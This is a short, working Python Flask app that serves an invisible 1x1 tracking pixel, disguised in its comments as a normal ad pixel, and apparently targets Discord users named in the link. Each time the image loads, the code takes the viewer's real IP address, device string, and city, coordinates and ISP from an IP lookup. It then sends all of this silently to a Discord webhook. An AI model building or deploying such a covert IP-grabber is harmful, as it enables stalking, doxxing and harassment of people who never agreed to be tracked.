from flask import Flask, request, Response
import requests
import os

app = Flask(__name__)

# Secure: Webhook from Render Environment
WEBHOOK_URL = os.getenv('WEBHOOK_URL')

# Get location from IP (free, accurate)
def get_location(ip):
    try:
        data = requests.get(f"https://ipapi.co/{ip}/json/").json()
        city = data.get("city", "Unknown")
        region = data.get("region", "Unknown")
        country = data.get("country_name", "Unknown")
        lat = data.get("latitude")
        lon = data.get("longitude")
        accuracy = data.get("accuracy_radius", "Unknown")
        isp = data.get("org", "Unknown")
        location = f"{city}, {region}, {country}"
        coords = f"({lat}, {lon}) ±{accuracy}km" if lat and lon else "Unknown"
        return location, coords, isp
    except:
        return "Unknown", "Unknown", "Unknown"

# STEALTH ROUTE: Looks like a normal ad pixel
@app.route('/pixel.gif')
def track():
    # Get real IP
    forwarded = request.headers.get('X-Forwarded-For')
    ip = forwarded.split(',')[0] if forwarded else request.remote_addr

    # Get user from ?user= (from Discord bot)
    user = request.args.get('user', 'Unknown')

    # Get device
    ua = request.headers.get('User-Agent', 'Unknown')

    # Get location
    location, coords, isp = get_location(ip)

    # Send to Discord
    if WEBHOOK_URL:
        payload = {
            "content": f"**Tracked**\n"
                       f"**User:** `{user}`\n"
                       f"**IP:** `{ip}`\n"
                       f"**Location:** {location}\n"
                       f"**Coordinates:** `{coords}`\n"
                       f"**ISP:** `{isp}`\n"
                       f"**Device:** `{ua[:80]}`..."
        }
        try:
            requests.post(WEBHOOK_URL, json=payload)
        except:
            pass  # Silent fail if webhook down

    # Return 1x1 transparent pixel (invisible!)
    pixel = (
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00"
        b"!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00"
        b"\x00\x02\x02D\x01\x00;"
    )
    return Response(pixel, mimetype='image/gif')

if __name__ == '__main__':
    app.run()
